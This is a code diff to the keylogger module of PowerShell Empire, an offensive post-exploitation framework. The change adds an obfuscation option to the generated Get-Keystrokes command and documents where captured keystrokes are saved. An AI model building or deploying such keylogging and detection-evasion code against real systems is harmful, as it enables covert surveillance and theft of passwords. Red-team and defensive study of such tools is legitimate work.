@@ -9,7 +9,7 @@ class Module:
 
             'Author': ['@obscuresec', '@mattifestation', '@harmj0y'],
 
-            'Description': ('Logs keys pressed, time and the active window (when changed).'),
+            'Description': ('Logs keys pressed, time and the active window (when changed) to the keystrokes.txt file. This file is located in the agents downloads directory Empire/downloads/<AgentName>/keystrokes.txt.'),
 
             'Background' : True,
 
@@ -50,7 +50,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Get-Keystrokes.ps1"
@@ -66,15 +66,17 @@ class Module:
 
         script = moduleCode
 
-        script += "Get-Keystrokes "
+        scriptEnd = "Get-Keystrokes "
 
         for option,values in self.options.iteritems():
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
                         # if we're just adding a switch
-                        script += " -" + str(option)
+                        scriptEnd += " -" + str(option)
                     else:
-                        script += " -" + str(option) + " " + str(values['Value'])
-
+                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
